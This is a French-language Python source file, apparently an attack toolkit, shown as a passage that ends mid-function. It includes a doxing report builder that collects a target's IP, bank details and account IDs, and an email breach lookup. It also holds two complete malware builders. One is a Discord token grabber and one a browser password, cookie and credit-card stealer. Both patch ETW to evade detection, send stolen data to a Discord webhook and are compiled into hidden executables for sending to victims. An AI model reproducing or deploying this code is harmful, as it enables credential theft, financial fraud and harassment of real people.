        ("OS",             "os_name"),
        ("Navigateur",     "browser"),
        ("Mobile",         "device_model"),
        ("Operateur tel",  "carrier_manual"),
        ("IP publique",    "public_ip"),
        ("IP locale",      "local_ip"),
        ("Discord ID",     "discord_id"),
        ("Steam ID",       "steam_id"),
        ("Roblox ID",      "roblox_id"),
    ]:
        v = _ask_manual(label)
        if v:
            profile["manual"][key] = v

    print(f"\n{WHITE}{BOLD}-- Finances --{RESET}")
    for label, key in [
        ("Banque",         "bank"),
        ("IBAN",           "iban"),
        ("Crypto wallet",  "wallet"),
        ("PayPal",         "paypal"),
    ]:
        v = _ask_manual(label)
        if v:
            profile["manual"][key] = v

    print(f"\n{WHITE}{BOLD}-- Notes --{RESET}")
    notes = input(f"{YELLOW}[?]{RESET} Notes libres (ENTREE pour skip) -> ").strip()
    if notes:
        profile["manual"]["notes"] = notes

    print(f"\n{WHITE}{BOLD}-- Fichiers locaux --{RESET}")
    print(f"{GRAY}Si tu as des photos/documents, mets-les dans le dossier Output/DoxCreator/{ident}/{RESET}")
    print(f"{GRAY}Ils seront listes dans le rapport.{RESET}")
    attach_dir = Path(_safe_workdir()) / "Output" / "DoxCreator" / re.sub(r"[^\w\-]", "_", ident)[:40]
    attach_dir.mkdir(parents=True, exist_ok=True)
    attachments = []
    try:
        for f in attach_dir.iterdir():
            if f.is_file():
                attachments.append(f.name)
        if attachments:
            print(f"{GREEN}[+] {len(attachments)} fichier(s) detecte(s) : {', '.join(attachments)}{RESET}")
        else:
            print(f"{GRAY}[i] Aucun fichier pour l'instant.{RESET}")
    except Exception:
        pass

    print(f"\n\n{CYAN}   [ PHASE 3 ] Generation du rapport{RESET}")

    def format_section(title, data):
        if not data:
            return ""
        lines = [f"\n[{title}]"]
        for k, v in data.items():
            lines.append(f"  {k:<20} : {v}")
        return "\n".join(lines) + "\n"

    report = f"""============================================================
                 OSINT / DOX REPORT — BASEDF TOOL
============================================================

Generated At       : {profile['created_at']}
Input Type         : {profile['input_type']}
Input Value        : {profile['input_value']}
Auto sources       : {len(profile['social'])} sites + {len(profile['breach'])} breach DB
Manual fields      : {len(profile['manual'])}
"""

    report += format_section("AUTO — IDENTITY", profile["identity"])
    report += format_section("AUTO — NETWORK", profile["network"])
    report += format_section("AUTO — IP GEOLOCATION", profile["ip_geo"])
    report += format_section("AUTO — PHONE", profile["phone"])
    report += format_section("AUTO — CONTACT", profile["contact"])
    report += format_section("AUTO — SOCIAL ACCOUNTS", profile["social"])

    if profile["breach"]:
        report += "\n[AUTO — BREACH DATA]\n"
        for src, res in profile["breach"].items():
            report += f"  {src} : {res.get('found')} fuites\n"
            for s in res.get("sources", [])[:15]:
                report += f"    - {s}\n"

    if profile["manual"]:
        report += "\n\n============================================================\n"
        report += "                    MANUAL DATA\n"
        report += "============================================================\n"
        for k, v in profile["manual"].items():
            report += f"  {k:<20} : {v}\n"

    if attachments:
        report += "\n[FICHIERS JOINTS]\n"
        for a in attachments:
            report += f"  {a}\n"

    if profile["dorks"]:
        report += "\n[GOOGLE DORKS]\n"
        for d in profile["dorks"]:
            report += f"  {d}\n"
            report += f"    https://www.google.com/search?q={urllib.parse.quote(d)}\n"

    report += "\n" + "=" * 60 + "\n"

    output_dir = Path(_safe_workdir()) / "Output" / "DoxCreator"
    output_dir.mkdir(parents=True, exist_ok=True)
    safe_name = re.sub(r"[^\w\-]", "_", ident)[:40]
    out_path = output_dir / f"DOX_{safe_name}.txt"
    with open(out_path, "w", encoding="utf-8") as f:
        f.write(report)

    print(f"\n{GREEN}[+] Rapport cree : {out_path}{RESET}")

    print(f"\n{CYAN}   RESUME{RESET}")
    print(f"{GREEN}[+] Comptes auto     : {len(profile['social'])}{RESET}")
    print(f"{GREEN}[+] Breaches         : {len(profile['breach'])}{RESET}")
    print(f"{GREEN}[+] Champs manuels   : {len(profile['manual'])}{RESET}")
    print(f"{GREEN}[+] Fichiers joints  : {len(attachments)}{RESET}")
    print(f"{GREEN}[+] Dorks generes    : {len(profile['dorks'])}{RESET}")
    if profile["ip_geo"]:
        print(f"{GREEN}[+] Geo IP           : {profile['ip_geo'].get('city')}, {profile['ip_geo'].get('country')}{RESET}")

    if os.name == "nt":
        try:
            os.startfile(str(output_dir))
        except Exception:
            pass
    pause()


# ============================================================
#                     OPTION 7 — EMAIL SEARCHER
# ============================================================

def option_7():
    clear()
    banner()
    if not _need_requests():
        pause()
        return

    print(f"\n{CYAN}   [ EMAIL SEARCHER — multi-sources ]{RESET}\n")
    print(f"{GRAY}Sources : LeakCheck, XposedOrNot, Intelligence X (optionnel).{RESET}\n")

    email = input(f"{CYAN}[?] Email a rechercher -> {RESET}").strip()
    if not email or "@" not in email or "." not in email:
        print(f"{RED}[!] Email invalide.{RESET}")
        pause()
        return

    results = {"breaches": [], "sources": [], "intelx": [], "pastes": []}
    rlock = threading.Lock()

    def check_leakcheck():
        try:
            enc = urllib.parse.quote(email, safe="")
            r = requests.get(f"https://leakcheck.io/api/public?check={enc}", timeout=15)
            if r.status_code == 429:
                with rlock:
                    print(f"{YELLOW}[!] LeakCheck : rate limite{RESET}")
                return
            if r.status_code != 200:
                return
            data = r.json()
            if data.get("success") and data.get("found", 0) > 0:
                with rlock:
                    results["breaches"].append({
                        "source": "LeakCheck.io",
                        "count": data.get("found", 0),
                        "fields": data.get("fields", []),
                        "sources": data.get("sources", [])[:30],
                    })
                    print(f"{RED}[!] LeakCheck   : {data.get('found')} fuites{RESET}")
                    for f in data.get("fields", [])[:10]:
                        print(f"{GRAY}    - champ : {f}{RESET}")
        except Exception:
            pass

    def check_xposedornot():
        try:
            enc = urllib.parse.quote(email, safe="")
            r = requests.get(f"https://xposedornot.com/v1/check-email/{enc}", timeout=15)
            if r.status_code != 200:
                return
            data = r.json()
            breaches = data.get("ExposedRecords") or data.get("breaches") or []
            if breaches:
                names = []
                for b in breaches:
                    if isinstance(b, dict):
                        n = b.get("breach") or b.get("name") or b.get("Name")
                        if n:
                            names.append(n)
                    elif isinstance(b, str):
                        names.append(b)
                if names:
                    with rlock:
                        results["breaches"].append({
                            "source": "XposedOrNot",
                            "count": len(names),
                            "sources": names[:30],
                        })
                        print(f"{RED}[!] XposedOrNot : {len(names)} fuites{RESET}")
                        for n in names[:10]:
                            print(f"{GRAY}    - {n}{RESET}")
        except Exception:
            pass

    def check_hibp_public():
        try:
            enc = urllib.parse.quote(email, safe="")
            r = requests.get(
                f"https://haveibeenpwned.com/unifiedsearch/{enc}",
                headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124",
                    "Accept": "application/json",
                },
                timeout=15,
            )
            if r.status_code == 200:
                data = r.json()
                breaches = data.get("Breaches", [])
                pastes = data.get("Pastes", [])
                if breaches or pastes:
                    with rlock:
                        results["breaches"].append({
                            "source": "Firefox Monitor / HIBP",
                            "count": len(breaches),
                            "sources": [b.get("Name") for b in breaches if b.get("Name")][:30],
                        })
                        if pastes:
                            results["pastes"] = pastes
                        print(f"{RED}[!] Firefox Monitor : {len(breaches)} breaches, {len(pastes)} pastes{RESET}")
        except Exception:
            pass

    def check_pastebin_dorks():
        dorks = [
            f'"{email}" site:pastebin.com',
            f'"{email}" site:ghostbin.co',
            f'"{email}" site:controlc.com',
            f'"{email}" site:rentry.co',
            f'"{email}" site:hastebin.com',
        ]
        with rlock:
            results["pastes"] = dorks
            print(f"{GREEN}[+] Dorks Pastebin : {len(dorks)} recherches{RESET}")

    def check_intelx():
        config_file = Path(_safe_workdir()) / "config.json"
        api_key = ""
        api_url = "https://free.intelx.io"

        if config_file.exists():
            try:
                with open(config_file, "r", encoding="utf-8") as f:
                    cfg = json.load(f)
                api_key = cfg.get("intelx", {}).get("api_key", "").strip()
                api_url = cfg.get("intelx", {}).get("api_url", api_url).rstrip("/")
            except Exception:
                pass

        if not api_key:
            with rlock:
                print(f"{GRAY}[i] IntelX : pas de cle API configuree (skip){RESET}")
            return

        try:
            headers = {"x-key": api_key, "User-Agent": "BasedF-IntelX"}
            payload = {
                "term": email,
                "buckets": [],
                "lookuplevel": 0,
                "timeout": 60,
                "datefrom": "",
                "dateto": "",
                "sort": 4,
                "media": 0,
            }
            r = requests.post(f"{api_url}/intelligent/search", headers=headers, json=payload, timeout=30)
            if r.status_code == 401:
                with rlock:
                    print(f"{RED}[!] IntelX : cle API invalide{RESET}")
                return
            if r.status_code >= 400:
                return
            data = r.json()
            records = data.get("records", [])
            with rlock:
                if records:
                    results["intelx"] = records
                    print(f"{GREEN}[+] IntelX : {len(records)} resultats{RESET}")
                else:
                    print(f"{GRAY}[i] IntelX : aucun resultat{RESET}")
        except Exception:
            pass

    print(f"{YELLOW}[*] Interrogation des sources...{RESET}\n")

    threads = [
        threading.Thread(target=check_leakcheck, daemon=True),
        threading.Thread(target=check_xposedornot, daemon=True),
        threading.Thread(target=check_hibp_public, daemon=True),
        threading.Thread(target=check_pastebin_dorks, daemon=True),
        threading.Thread(target=check_intelx, daemon=True),
    ]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    print(f"\n{CYAN}   RESUME{RESET}")
    total_breaches = sum(b.get("count", 0) for b in results["breaches"])
    print(f"{GREEN}[+] Breaches trouvees  : {total_breaches}{RESET}")
    print(f"{GREEN}[+] Sources breach     : {len(results['breaches'])}{RESET}")
    print(f"{GREEN}[+] IntelX             : {len(results['intelx'])}{RESET}")
    print(f"{GREEN}[+] Paste dorks        : {len(results['pastes'])}{RESET}")

    if results["breaches"]:
        print(f"\n{CYAN}--- DETAIL BREACHES ---{RESET}")
        for b in results["breaches"]:
            print(f"\n{GREEN}[{b['source']}]{RESET} — {b.get('count', 0)} fuites")
            for s in b.get("sources", [])[:20]:
                print(f"{GRAY}  - {s}{RESET}")
            for f in b.get("fields", [])[:10]:
                print(f"{YELLOW}  [champ expose] {f}{RESET}")

    if results["intelx"]:
        print(f"\n{CYAN}--- DETAIL INTELX ---{RESET}")
        for i, rec in enumerate(results["intelx"][:20], 1):
            print(f"{CYAN}[{i}]{RESET} {WHITE}{rec.get('name', 'N/A')}{RESET}")
            print(f"    ID     : {rec.get('storageid', 'N/A')}")
            print(f"    Bucket : {rec.get('bucket', 'N/A')}")
            print(f"    Date   : {rec.get('date', 'N/A')}")

    if results["pastes"]:
        print(f"\n{CYAN}--- PASTE DORKS ---{RESET}")
        for d in results["pastes"]:
            print(f"{GRAY}  {d}{RESET}")
            print(f"{GRAY}  https://www.google.com/search?q={urllib.parse.quote(d)}{RESET}")

    try:
        out_dir = Path(_safe_workdir()) / "Output" / "EmailSearch"
        out_dir.mkdir(parents=True, exist_ok=True)
        safe = re.sub(r"[^\w\-]", "_", email)[:60]
        out_file = out_dir / f"report_{safe}.txt"
        with open(out_file, "w", encoding="utf-8") as f:
            f.write(f"Email: {email}\n")
            f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("=" * 60 + "\n\n")
            f.write("[BREACHES]\n")
            total = 0
            for b in results["breaches"]:
                f.write(f"\n  Source: {b['source']}  ({b.get('count', 0)} fuites)\n")
                total += b.get("count", 0)
                for s in b.get("sources", []):
                    f.write(f"    - {s}\n")
                for fl in b.get("fields", []):
                    f.write(f"    [champ] {fl}\n")
            f.write(f"\n  TOTAL: {total} entrees\n")

            if results["intelx"]:
                f.write("\n[INTELX]\n")
                for i, rec in enumerate(results["intelx"], 1):
                    f.write(f"  [{i}] {rec.get('name', 'N/A')}\n")
                    f.write(f"      ID: {rec.get('storageid', 'N/A')}\n")
                    f.write(f"      Date: {rec.get('date', 'N/A')}\n")

            if results["pastes"]:
                f.write("\n[PASTE DORKS]\n")
                for d in results["pastes"]:
                    f.write(f"  {d}\n")
                    f.write(f"    https://www.google.com/search?q={urllib.parse.quote(d)}\n")

        print(f"\n{GREEN}[+] Rapport sauvegarde : {out_file}{RESET}")
    except Exception as e:
        print(f"{YELLOW}[!] Export impossible : {e}{RESET}")

    if os.name == "nt":
        try:
            os.startfile(str(Path(_safe_workdir()) / "Output" / "EmailSearch"))
        except Exception:
            pass
    pause()


# ============================================================
#         OPTION 8 — TOKEN GRABBER BUILDER
# ============================================================

def option_8():
    clear()
    banner()

    print(f"\n{CYAN}   [ DISCORD TOKEN GRABBER BUILDER ]{RESET}\n")
    webhook = input(f"{YELLOW}[?]{RESET} Webhook URL -> ").strip()
    if not webhook.startswith("https://discord.com/api/webhooks/"):
        print(f"{RED}[!] Webhook invalide.{RESET}")
        pause()
        return

    source = r'''import os, re, sys, json, base64, ctypes, sqlite3, subprocess, requests

def patch_etw():
    try:
        k = ctypes.windll.kernel32
        addr = ctypes.cast(k.GetProcAddress(k.GetModuleHandleA(b"ntdll.dll"), b"EtwEventWrite"), ctypes.c_void_p)
        old = ctypes.c_ulong(0)
        k.VirtualProtect(addr, 0x10, 0x40, ctypes.byref(old))
        ctypes.memmove(addr, b"\xB8\x00\x00\x00\xC0\xC3", 6)
        k.VirtualProtect(addr, 0x10, old.value, ctypes.byref(old))
    except Exception:
        pass

patch_etw()

for _p in ["requests", "pycryptodome", "pywin32"]:
    try:
        __import__({"pycryptodome": "Crypto", "pywin32": "win32crypt"}.get(_p, _p))
    except ImportError:
        try:
            subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", _p],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=120)
        except Exception:
            pass

import requests, win32crypt
from Crypto.Cipher import AES

WEBHOOK = "__WEBHOOK_URL__"
APPDATA = os.getenv("APPDATA", "")
LOCAL = os.getenv("LOCALAPPDATA", "")

HTTP = requests.Session()
HTTP.headers.update({"User-Agent": "Mozilla/5.0 Chrome/120.0"})

ROOTS = [
    ("Discord", os.path.join(APPDATA, "discord")),
    ("Discord Canary", os.path.join(APPDATA, "discordcanary")),
    ("Discord PTB", os.path.join(APPDATA, "discordptb")),
    ("Chrome", os.path.join(LOCAL, "Google", "Chrome", "User Data")),
    ("Chrome Beta", os.path.join(LOCAL, "Google", "Chrome Beta", "User Data")),
    ("Edge", os.path.join(LOCAL, "Microsoft", "Edge", "User Data")),
    ("Brave", os.path.join(LOCAL, "BraveSoftware", "Brave-Browser", "User Data")),
    ("Opera", os.path.join(APPDATA, "Opera Software", "Opera Stable")),
    ("Opera GX", os.path.join(APPDATA, "Opera Software", "Opera GX Stable")),
    ("Vivaldi", os.path.join(LOCAL, "Vivaldi", "User Data")),
    ("Yandex", os.path.join(LOCAL, "Yandex", "YandexBrowser", "User Data")),
]

def get_key(path):
    try:
        with open(os.path.join(path, "Local State"), "r", encoding="utf-8") as f:
            ls = json.load(f)
        enc = base64.b64decode(ls["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1]
    except Exception:
        return None

def decrypt(enc, key):
    try:
        raw = base64.b64decode(enc.split("dQw4w9WgXcQ:")[1])
        iv, payload = raw[3:15], raw[15:-16]
        return AES.new(key, AES.MODE_GCM, iv).decrypt(payload).decode("utf-8", errors="ignore")
    except Exception:
        return None

def profiles(root):
    if not os.path.isdir(root):
        return []
    if os.path.isdir(os.path.join(root, "Local Storage", "leveldb")):
        return [root]
    out = []
    d = os.path.join(root, "Default")
    if os.path.isdir(os.path.join(d, "Local Storage", "leveldb")):
        out.append(d)
    try:
        for x in sorted(os.listdir(root)):
            p = os.path.join(root, x)
            if x.startswith("Profile ") and os.path.isdir(os.path.join(p, "Local Storage", "leveldb")):
                out.append(p)
    except Exception:
        pass
    return out

TOKEN_RE = re.compile(r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}|dQw4w9WgXcQ:[^\"]*")

def extract(profile):
    ldb = os.path.join(profile, "Local Storage", "leveldb")
    found = set()
    if not os.path.isdir(ldb):
        return found
    try:
        for f in os.listdir(ldb):
            if not f.endswith((".ldb", ".log")):
                continue
            try:
                with open(os.path.join(ldb, f), "r", errors="ignore") as fh:
                    for line in fh:
                        for m in TOKEN_RE.findall(line):
                            found.add(m)
            except Exception:
                continue
    except Exception:
        pass
    return found

def normalize_token(tok, key):
    if tok.startswith("dQw4w9WgXcQ:"):
        return decrypt(tok, key)
    return tok

def valid(tok):
    try:
        r = HTTP.get("https://discord.com/api/v9/users/@me",
                     headers={"Authorization": tok}, timeout=8)
        return r.status_code == 200
    except Exception:
        return False

def get_info(tok):
    try:
        r = HTTP.get("https://discord.com/api/v9/users/@me",
                     headers={"Authorization": tok}, timeout=8)
        if r.status_code == 200:
            return r.json()
    except Exception:
        pass
    return None

def get_billing(tok):
    try:
        r = HTTP.get("https://discord.com/api/v9/users/@me/billing/subscriptions",
                     headers={"Authorization": tok}, timeout=8)
        if r.status_code == 200:
            subs = r.json()
            return len(subs) > 0
    except Exception:
        pass
    return False

NITRO_MAP = {0: "None", 1: "Nitro Classic", 2: "Nitro", 3: "Nitro Basic"}

def build_embed(src, tok, inf, has_nitro):
    nitro_type = NITRO_MAP.get(inf.get("premium_type", 0), "None")
    if has_nitro and nitro_type == "None":
        nitro_type = "Nitro (billing)"

    username = inf.get("username", "N/A")
    discriminator = inf.get("discriminator", "0")
    display = f"{username}#{discriminator}" if discriminator != "0" else f"@{username}"

    avatar_hash = inf.get("avatar")
    user_id = inf.get("id", "N/A")
    avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_hash}.png" if avatar_hash else ""

    return {
        "title": f"Token captured — {src}",
        "color": 0x8B0000,
        "thumbnail": {"url": avatar_url} if avatar_url else {},
        "fields": [
            {"name": "Token", "value": f"```{tok}```", "inline": False},
            {"name": "Username", "value": display, "inline": True},
            {"name": "User ID", "value": user_id, "inline": True},
            {"name": "Email", "value": inf.get("email") or "N/A", "inline": True},
            {"name": "Email verified", "value": "Yes" if inf.get("verified") else "No", "inline": True},
            {"name": "Phone", "value": inf.get("phone") or "N/A", "inline": True},
            {"name": "MFA", "value": "Enabled" if inf.get("mfa_enabled") else "Disabled", "inline": True},
            {"name": "Nitro", "value": nitro_type, "inline": True},
            {"name": "Locale", "value": inf.get("locale", "N/A"), "inline": True},
        ],
        "footer": {"text": f"Source: {src}"},
    }

def send_embed(embed):
    try:
        HTTP.post(WEBHOOK, json={"embeds": [embed]}, timeout=15)
    except Exception:
        pass

def main():
    seen = set()
    captured = 0
    for name, root in ROOTS:
        if not os.path.isdir(root):
            continue
        key = get_key(root)
        if not key:
            continue
        for prof in profiles(root):
            tag = name if prof == root or os.path.basename(prof) == "Default" \
                  else f"{name} / {os.path.basename(prof)}"
            for raw in extract(prof):
                tok = normalize_token(raw, key)
                if not tok or tok in seen:
                    continue
                if not valid(tok):
                    continue
                inf = get_info(tok)
                if not inf:
                    continue
                seen.add(tok)
                has_nitro = get_billing(tok)
                send_embed(build_embed(tag, tok, inf, has_nitro))
                captured += 1
    if captured:
        try:
            HTTP.post(WEBHOOK, json={
                "content": f"**{captured} token(s) capturé(s)**"
            }, timeout=10)
        except Exception:
            pass

if __name__ == "__main__":
    if os.name != "nt":
        sys.exit(1)
    main()
'''

    src = source.replace("__WEBHOOK_URL__", webhook)
    tmp = _safe_tmp("_grabber_tmp.py")
    with open(tmp, "w", encoding="utf-8") as f:
        f.write(src)

    try:
        import PyInstaller  # noqa
    except ImportError:
        print(f"{YELLOW}[+] Installation de PyInstaller...{RESET}")
        subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "pyinstaller"],
                       cwd=_safe_cwd(), check=True)

    dist_dir = _safe_dist()
    work_dir = _safe_tmp("build_grabber")
    spec_dir = _safe_workdir()

    print(f"{YELLOW}[+] Compilation...{RESET}")
    args = [
        sys.executable, "-m", "PyInstaller",
        "--onefile", "--noconsole", "--clean",
        "--name", "grabber",
        "--distpath", dist_dir,
        "--workpath", work_dir,
        "--specpath", spec_dir,
        "--hidden-import=requests",
        "--hidden-import=win32crypt",
        "--hidden-import=Crypto.Cipher",
        "--runtime-tmpdir", "%TEMP%",
        tmp,
    ]
    r = subprocess.run(args, capture_output=True, text=True, cwd=_safe_cwd())
    if r.returncode != 0:
        print(f"{RED}[-] Echec compilation.{RESET}")
        print(r.stderr[-1500:])
        pause()
        return

    exe = os.path.join(dist_dir, "grabber.exe")
    print(f"{GREEN}[+] Termine : {exe}{RESET}")
    print(f"{GRAY}[i] Envoie grabber.exe a la cible.{RESET}")

    for p in [tmp, os.path.join(spec_dir, "grabber.spec"), work_dir]:
        try:
            if os.path.isdir(p):
                shutil.rmtree(p, ignore_errors=True)
            elif os.path.isfile(p):
                os.remove(p)
        except Exception:
            pass
    pause()


# ============================================================
#         OPTION 9 — PASSWORD STEALER BUILDER
# ============================================================

def option_9():
    clear()
    banner()

    print(f"\n{CYAN}   [ PASSWORD STEALER BUILDER ]{RESET}\n")
    webhook = input(f"{YELLOW}[?]{RESET} Webhook URL -> ").strip()
    if not webhook.startswith("https://discord.com/api/webhooks/"):
        print(f"{RED}[!] Webhook invalide.{RESET}")
        pause()
        return

    source = r'''import os, sys, json, base64, ctypes, sqlite3, subprocess, shutil, socket, platform
import requests, win32crypt
from Crypto.Cipher import AES
from datetime import datetime

def patch_etw():
    try:
        k = ctypes.windll.kernel32
        addr = ctypes.cast(k.GetProcAddress(k.GetModuleHandleA(b"ntdll.dll"), b"EtwEventWrite"), ctypes.c_void_p)
        old = ctypes.c_ulong(0)
        k.VirtualProtect(addr, 0x10, 0x40, ctypes.byref(old))
        ctypes.memmove(addr, b"\xB8\x00\x00\x00\xC0\xC3", 6)
        k.VirtualProtect(addr, 0x10, old.value, ctypes.byref(old))
    except Exception:
        pass

patch_etw()

WEBHOOK = "__WEBHOOK_URL__"
APPDATA = os.getenv("APPDATA", "")
LOCAL = os.getenv("LOCALAPPDATA", "")
TEMP = os.getenv("TEMP", "")

HTTP = requests.Session()
HTTP.headers.update({"User-Agent": "Mozilla/5.0 Chrome/120.0"})

BROWSERS = {
    "Chrome":     os.path.join(LOCAL, "Google", "Chrome", "User Data"),
    "Chrome Beta": os.path.join(LOCAL, "Google", "Chrome Beta", "User Data"),
    "Edge":       os.path.join(LOCAL, "Microsoft", "Edge", "User Data"),
    "Brave":      os.path.join(LOCAL, "BraveSoftware", "Brave-Browser", "User Data"),
    "Vivaldi":    os.path.join(LOCAL, "Vivaldi", "User Data"),
    "Opera":      os.path.join(APPDATA, "Opera Software", "Opera Stable"),
    "Opera GX":   os.path.join(APPDATA, "Opera Software", "Opera GX Stable"),
    "Yandex":     os.path.join(LOCAL, "Yandex", "YandexBrowser", "User Data"),
}

def get_sysinfo():
    try:
        ip = HTTP.get("https://api.ipify.org", timeout=5).text
    except Exception:
        ip = "?"
    try:
        user = os.getlogin()
    except Exception:
        user = "?"
    return {
        "hostname": socket.gethostname(),
        "username": user,
        "os": platform.system() + " " + platform.release(),
        "arch": platform.machine(),
        "public_ip": ip,
        "timestamp": datetime.now().isoformat(),
    }

def get_key(path):
    try:
        with open(os.path.join(path, "Local State"), "r", encoding="utf-8") as f:
            ls = json.load(f)
        enc = base64.b64decode(ls["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1]
    except Exception:
        return None

def decrypt(enc, key):
    try:
        if not enc:
            return ""
        if enc[:3] in (b"v10", b"v11"):
            iv, payload, tag = enc[3:15], enc[15:-16], enc[-16:]
            c = AES.new(key, AES.MODE_GCM, iv)
            return c.decrypt_and_verify(payload, tag).decode("utf-8", errors="ignore")
        return win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1].decode("utf-8", errors="ignore")
    except Exception:
        return ""

def profiles(root):
    if not os.path.isdir(root):
        return []
    out = []
    d = os.path.join(root, "Default")
    if os.path.isdir(d):
        out.append(d)
    try:
        for x in sorted(os.listdir(root)):
            p = os.path.join(root, x)
            if x.startswith("Profile ") and os.path.isdir(p):
                out.append(p)
    except Exception:
        pass
    return out

def copy_db(src):
    if not os.path.exists(src):
        return None
    tmp = os.path.join(TEMP, f"_db_{os.getpid()}_{os.urandom(4).hex()}.db")
    try:
        shutil.copy2(src, tmp)
        return tmp
    except Exception:
        return None

def x_passwords(profile, key):
    db = copy_db(os.path.join(profile, "Login Data"))
    if not db:
        return []
    out = []
    try:
        con = sqlite3.connect(db)
        for url, user, enc in con.execute(
            "SELECT origin_url, username_value, password_value FROM logins"
        ):
            if not enc:
                continue
            pw = decrypt(enc, key)
            if pw:
                out.append({"url": url, "user": user, "pass": pw})
        con.close()
    except Exception:
        pass
    finally:
        try: os.remove(db)
        except: pass
    return out

def x_cookies(profile, key):
    for c in [os.path.join(profile, "Network", "Cookies"), os.path.join(profile, "Cookies")]:
        db = copy_db(c)
        if not db:
            continue
        out = []
        try:
            con = sqlite3.connect(db)
            for host, name, enc in con.execute(
                "SELECT host_key, name, encrypted_value FROM cookies LIMIT 1000"
            ):
                if not enc:
                    continue
                v = decrypt(enc, key)
                if v:
                    out.append({"host": host, "name": name, "value": v[:200]})
            con.close()
        except Exception:
            pass
        finally:
            try: os.remove(db)
            except: pass
        return out
    return []

def x_cards(profile, key):
    db = copy_db(os.path.join(profile, "Web Data"))
    if not db:
        return []
    out = []
    try:
        con = sqlite3.connect(db)
        for name, month, year, number, enc in con.execute(
            "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, card_number_encrypted FROM credit_cards"
        ):
            num = decrypt(enc, key) if enc else ""
            if num or name:
                out.append({
                    "name": name,
                    "exp": f"{month}/{year}" if month and year else "",
                    "number": num,
                })
        con.close()
    except Exception:
        pass
    finally:
        try: os.remove(db)
        except: pass
    return out

def x_autofill(profile):
    db = copy_db(os.path.join(profile, "Web Data"))
    if not db:
        return []
    out = []
    try:
        con = sqlite3.connect(db)
        for name, value in con.execute(
            "SELECT name, value FROM autofill LIMIT 200"
        ):
            if name and value:
                out.append({"field": name, "value": value})
        con.close()
    except Exception:
        pass
    finally:
        try: os.remove(db)
        except: pass
    return out

def x_history(profile, limit=200):
    db = copy_db(os.path.join(profile, "History"))
    if not db:
        return []
    out = []
    try:
        con = sqlite3.connect(db)
        for url, title, cnt in con.execute(
            f"SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT {limit}"
        ):
            out.append({"url": url[:150], "title": (title or "")[:80], "visits": cnt})
        con.close()
    except Exception:
        pass
    finally:
        try: os.remove(db)
        except: pass
    return out

def x_tokens(profile, key):
    import re
    ldb = os.path.join(profile, "Local Storage", "leveldb")
    if not os.path.isdir(ldb):
        return []
    TOKEN_RE = re.compile(r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}|dQw4w9WgXcQ:[^\"]*")
    found = set()
    try:
        for f in os.listdir(ldb):
            if not f.endswith((".ldb", ".log")):
                continue
            try:
                with open(os.path.join(ldb, f), "r", errors="ignore") as fh:
                    for line in fh:
                        for m in TOKEN_RE.findall(line):
                            found.add(m)
            except Exception:
                continue
    except Exception:
        pass
    out = []
    for raw in found:
        if raw.startswith("dQw4w9WgXcQ:"):
            t = decrypt(base64.b64decode(raw.split(":")[1]), key)
        else:
            t = raw
        if t:
            out.append(t)
    return out

def send_embed(title, description, color=0x8B0000):
    for chunk in [description[i:i+1900] for i in range(0, len(description), 1900)]:
        try:
            HTTP.post(WEBHOOK, json={"embeds": [{
                "title": title,
                "description": chunk,
                "color": color,
            }]}, timeout=15)
        except Exception:
            pass

def send_file(path, filename):
    try:
        with open(path, "rb") as f:
            HTTP.post(WEBHOOK, files={"file": (filename, f.read(), "application/json")}, timeout=60)
    except Exception:
        pass

def main():
    sysinfo = get_sysinfo()

    header = (
        f"**Hostname** : `{sysinfo['hostname']}`\n"
        f"**User** : `{sysinfo['username']}`\n"
        f"**OS** : `{sysinfo['os']}` ({sysinfo['arch']})\n"
        f"**IP** : `{sysinfo['public_ip']}`\n"
        f"**Date** : `{sysinfo['timestamp']}`"
    )
    send_embed("Password Stealer — Système", header, color=0x2C2F33)

    total_pw = 0
    total_cks = 0
    total_cards = 0
    total_tokens = 0
    all_data = {"system": sysinfo, "browsers": {}}

    for name, root in BROWSERS.items():
        if not os.path.isdir(root):
            continue
        key = get_key(root)
        if not key:
            continue

        browser_data = {"passwords": [], "cookies": [], "cards": [],
                        "autofill": [], "history": [], "tokens": []}

        for prof in profiles(root):
            try:
                pws = x_passwords(prof, key)
                browser_data["passwords"].extend(pws)
                total_pw += len(pws)

                cks = x_cookies(prof, key)
                browser_data["cookies"].extend(cks)
                total_cks += len(cks)

                crds = x_cards(prof, key)
                browser_data["cards"].extend(crds)
                total_cards += len(crds)

                af = x_autofill(prof)
                browser_data["autofill"].extend(af)

                hist = x_history(prof)
                browser_data["history"].extend(hist)

                tks = x_tokens(prof, key)
                browser_data["tokens"].extend(tks)
                total_tokens += len(tks)
            except Exception:
                continue

        if any(browser_data.values()):
            all_data["browsers"][name] = browser_data

    pw_lines = []
    for bname, bdata in all_data["browsers"].items():
        if not bdata["passwords"]:
            continue
        pw_lines.append(f"\n__**{bname}**__ ({len(bdata['passwords'])} entrées)")
        for p in bdata["passwords"][:25]:
            pw_lines.append(
                f"`URL  :` {p['url'][:80]}\n"
                f"`User :` {p['user']}\n"
                f"`Pass :` {p['pass']}\n---"
            )
        if len(bdata["passwords"]) > 25:
            pw_lines.append(f"_... +{len(bdata['passwords']) - 25} autres_")
    if pw_lines:
        send_embed(f"Passwords ({total_pw} trouvés)", "\n".join(pw_lines))

    card_lines = []
    for bname, bdata in all_data["browsers"].items():
        if not bdata["cards"]:
            continue
        card_lines.append(f"\n__**{bname}**__")
        for c in bdata["cards"]:
            card_lines.append(
                f"`Name :` {c['name']}\n"
                f"`Num  :` {c['number']}\n"
                f"`Exp  :` {c['exp']}\n---"
            )
    if card_lines:
        send_embed(f"Cartes bancaires ({total_cards})", "\n".join(card_lines), color=0xFFD700)

    token_lines = []
    for bname, bdata in all_data["browsers"].items():
